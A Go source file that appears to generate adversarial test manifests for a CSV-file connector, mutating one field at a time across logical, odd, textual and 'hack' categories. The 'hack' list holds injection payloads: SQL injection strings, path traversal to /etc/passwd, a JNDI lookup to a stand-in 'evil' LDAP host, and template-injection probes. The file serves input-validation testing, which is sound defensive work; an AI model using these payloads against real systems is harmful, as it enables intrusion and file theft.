package generator

import (
	"fmt"
	"strings"
)

// manifestFields holds the mutable csv-file manifest fields. Defaults come from
// baseline(); each variant mutates exactly one logical field for clean attribution.
type manifestFields struct {
	name          string
	transportKind string
	path          string
	delimiter     string
	encoding      string // "" omits the line
	chunkSize     string // raw token so weird values (-1, 100001, 999999999) render
	afterProcess  string
	archivePath   string // "" omits the line
	schedule      string // "" omits the line
	keyEnv        string // "" omits the line
	scopes        []string
}

func baseline(seed int64) manifestFields {
	return manifestFields{
		name:          fmt.Sprintf("otk-adv-%d", seed),
		transportKind: "local",
		path:          "/tmp/otk/in/*.csv",
		delimiter:     ",",
		chunkSize:     "1000",
		afterProcess:  "none",
		scopes:        []string{"otk"},
	}
}

func render(m manifestFields) string {
	var b strings.Builder
	fmt.Fprintf(&b, "apiVersion: connectors.lumnik.io/v1\n")
	fmt.Fprintf(&b, "kind: Connector\n")
	fmt.Fprintf(&b, "metadata:\n")
	fmt.Fprintf(&b, "  name: %q\n", m.name)
	fmt.Fprintf(&b, "  connector_type: csv-file\n")
	fmt.Fprintf(&b, "  scopes: [%s]\n", renderScopes(m.scopes))
	fmt.Fprintf(&b, "spec:\n")
	fmt.Fprintf(&b, "  transport:\n")
	fmt.Fprintf(&b, "    kind: %q\n", m.transportKind)
	fmt.Fprintf(&b, "    path: %q\n", m.path)
	if m.keyEnv != "" {
		fmt.Fprintf(&b, "    key_env: %q\n", m.keyEnv)
	}
	fmt.Fprintf(&b, "  parser:\n")
	fmt.Fprintf(&b, "    delimiter: %q\n", m.delimiter)
	if m.encoding != "" {
		fmt.Fprintf(&b, "    encoding: %q\n", m.encoding)
	}
	fmt.Fprintf(&b, "    chunk_size: %s\n", m.chunkSize)
	fmt.Fprintf(&b, "  after_process: %q\n", m.afterProcess)
	if m.archivePath != "" {
		fmt.Fprintf(&b, "  archive_path: %q\n", m.archivePath)
	}
	if m.schedule != "" {
		fmt.Fprintf(&b, "  schedule: %q\n", m.schedule)
	}
	fmt.Fprintf(&b, "  target: {}\n")
	return b.String()
}

func renderScopes(scopes []string) string {
	qs := make([]string, len(scopes))
	for i, t := range scopes {
		qs[i] = fmt.Sprintf("%q", t)
	}
	return strings.Join(qs, ", ")
}

func manyScopes(n int) []string {
	t := make([]string, n)
	for i := range t {
		t[i] = fmt.Sprintf("t%d", i)
	}
	return t
}

// variant is one adversarial mutation within a category.
type variant struct {
	name     string
	field    string
	payloads []string
	mutate   func(m *manifestFields, payload string)
}

// categories is the fixed selection order (index = hash % 4). Do not reorder
// without a corpus-version bump.
var categories = []string{"logical", "weird", "textual", "hack"}

var variantsByCategory = map[string][]variant{
	"logical": {
		{name: "move-without-path", field: "spec.after_process", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.afterProcess = "move"; m.archivePath = "" }},
		{name: "chunk-out-of-range", field: "spec.parser.chunk_size", payloads: []string{"-1", "0", "999999999"},
			mutate: func(m *manifestFields, p string) { m.chunkSize = p }},
		{name: "sftp-no-creds", field: "spec.transport", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.transportKind = "sftp" }},
		{name: "bad-cron", field: "spec.schedule", payloads: []string{"not a cron", "* * *", "99 99 99 99 99"},
			mutate: func(m *manifestFields, p string) { m.schedule = p }},
		{name: "archive-no-bucket", field: "spec.after_process", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.afterProcess = "archive" }},
	},
	"weird": {
		{name: "empty-path", field: "spec.transport.path", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.path = "" }},
		{name: "huge-path", field: "spec.transport.path", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.path = strings.Repeat("A", 100000) }},
		{name: "empty-delimiter", field: "spec.parser.delimiter", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.delimiter = "" }},
		{name: "multichar-delimiter", field: "spec.parser.delimiter", payloads: []string{";;;", "<=>", "||"},
			mutate: func(m *manifestFields, p string) { m.delimiter = p }},
		{name: "chunk-boundary", field: "spec.parser.chunk_size", payloads: []string{"1", "100000", "100001"},
			mutate: func(m *manifestFields, p string) { m.chunkSize = p }},
		{name: "huge-scopes", field: "metadata.scopes", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.scopes = manyScopes(10000) }},
		{name: "unicode-glob-path", field: "spec.transport.path", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.path = "/tmp/données/*.csv" }},
	},
	"textual": {
		{name: "rtl-override", field: "name", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.name = "otk\u202eadv" }},
		{name: "null-byte", field: "name", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.name = "otk\x00adv" }},
		{name: "sql-keyword-name", field: "name", payloads: []string{"drop table", "select", "; delete"},
			mutate: func(m *manifestFields, p string) { m.name = p }},
		{name: "long-identifier", field: "name", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.name = strings.Repeat("a", 5000) }},
		{name: "bad-encoding", field: "spec.parser.encoding", payloads: []string{"NONSENSE-42", "UTF-99"},
			mutate: func(m *manifestFields, p string) { m.encoding = p }},
		{name: "confusable-path", field: "spec.transport.path", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.path = "/tmp/\u043etk/*.csv" }}, // Cyrillic '\u043e'
		{name: "zero-width-name", field: "name", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.name = "otk\ufeffadv" }},
	},
	"hack": {
		{name: "sqli", field: "name", payloads: []string{"'; DROP TABLE core.connector;--", "1 OR 1=1", "x'--"},
			mutate: func(m *manifestFields, p string) { m.name = p }},
		{name: "path-traversal", field: "spec.transport.path",
			payloads: []string{"../../etc/passwd", "/etc/passwd", "....//....//etc/passwd"},
			mutate:   func(m *manifestFields, p string) { m.path = p }},
		{name: "jndi", field: "spec.transport.path", payloads: []string{"${jndi:ldap://evil/x}", "${env:HOME}"},
			mutate: func(m *manifestFields, p string) { m.path = p }},
		{name: "secret-echo", field: "spec.transport.key_env", payloads: []string{"OTK_SENTINEL_SECRET"},
			mutate: func(m *manifestFields, p string) { m.keyEnv = p }},
		{name: "oversized", field: "spec.transport.path", payloads: []string{""},
			mutate: func(m *manifestFields, _ string) { m.path = strings.Repeat("Z", 1000000) }},
		{name: "env-template-in-path", field: "spec.transport.path",
			payloads: []string{"${HOME}/*.csv", "%PATH%/*.csv"},
			mutate:   func(m *manifestFields, p string) { m.path = p }},
		{name: "ssti-in-name", field: "name",
			payloads: []string{"{{7*7}}", "<%= 7*7 %>", "${7*7}"},
			mutate:   func(m *manifestFields, p string) { m.name = p }},
	},
}
